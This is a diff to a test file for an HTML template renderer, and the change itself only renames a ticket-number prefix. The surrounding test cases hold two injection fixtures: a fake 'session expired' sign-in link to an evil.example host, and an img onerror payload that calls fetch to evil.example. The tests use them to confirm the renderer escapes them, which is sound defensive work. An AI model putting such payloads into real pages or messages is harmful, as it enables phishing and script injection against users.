@@ -21,7 +21,7 @@ describe('renderHtmlTemplate (SB-H3)', () => {
     const attack =
       '<a href="https://servicebridge-sso.evil.example">Session expired - sign in again</a>';
     const html = renderHtmlTemplate('<p>Ticket <strong>{{ticketNumber}}</strong> — {{ticketTitle}}</p>', {
-      ticketNumber: 'SB-26-000101',
+      ticketNumber: 'ET-26-000101',
       ticketTitle: attack,
     });
     expect(html).not.toContain('<a href=');
@@ -41,7 +41,7 @@ describe('renderHtmlTemplate (SB-H3)', () => {
     expect(seed).toBeDefined();
     const html = renderHtmlTemplate(seed!.bodyHtml, {
       customerName: '<img src=x onerror="fetch(\'https://evil.example/c\')">',
-      ticketNumber: 'SB-26-000101',
+      ticketNumber: 'ET-26-000101',
       feedbackUrl: 'https://app.example/feedback/abc',
       companyName: 'Acme',
     });
